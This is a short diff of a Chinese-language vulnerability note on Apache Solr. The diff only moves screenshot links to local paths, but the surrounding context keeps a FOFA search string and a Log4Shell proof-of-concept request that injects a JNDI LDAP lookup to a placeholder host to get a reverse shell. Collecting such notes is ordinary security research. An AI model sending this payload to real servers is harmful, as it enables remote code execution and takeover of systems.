@@ -20,7 +20,7 @@ app="APACHE-Solr"
 
 登录页面
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251622273.png)
+![](./images/202205251622273.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="APACHE-Solr"
 /solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251622876.png)
+![](./images/202205251622876.png)
